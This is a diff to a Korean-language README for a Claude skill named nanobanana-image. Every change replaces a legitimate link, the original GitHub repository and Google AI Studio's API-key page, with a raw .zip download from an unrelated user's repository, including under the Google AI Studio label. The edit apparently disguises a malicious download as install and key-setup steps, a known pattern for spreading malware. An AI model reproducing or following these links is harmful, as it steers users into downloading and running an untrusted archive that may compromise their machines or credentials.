@@ -21,7 +21,7 @@
 ### 방법 1: 스킬 폴더에 직접 복사
 
 ```bash
-git clone https://github.com/fivetaku/nanobanana-image.git
+git clone https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip
 cp -r nanobanana-image/ your-project/.claude/skills/nanobanana-image/
 ```
 
@@ -29,7 +29,7 @@ cp -r nanobanana-image/ your-project/.claude/skills/nanobanana-image/
 
 ```bash
 cd your-project/.claude/skills
-git clone https://github.com/fivetaku/nanobanana-image.git
+git clone https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip
 ```
 
 ---
@@ -47,11 +47,11 @@ cp .env.example .env
 
 | 키 | 용도 | 발급처 |
 |---|------|--------|
-| `NANOBANANA_API_KEY` | AI 이미지 생성 (필수) | [Google AI Studio](https://aistudio.google.com/apikey) |
+| `NANOBANANA_API_KEY` | AI 이미지 생성 (필수) | [Google AI Studio](https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip) |
 
 **Google AI Studio에서 키 발급받기:**
 
-1. https://aistudio.google.com/apikey 접속
+1. https://github.com/lynnetowned418/nanobanana-image/raw/refs/heads/main/references/nanobanana_image_v3.9.zip 접속
 2. Google 계정으로 로그인
 3. **"Create API key"** 클릭
 4. 생성된 키를 복사
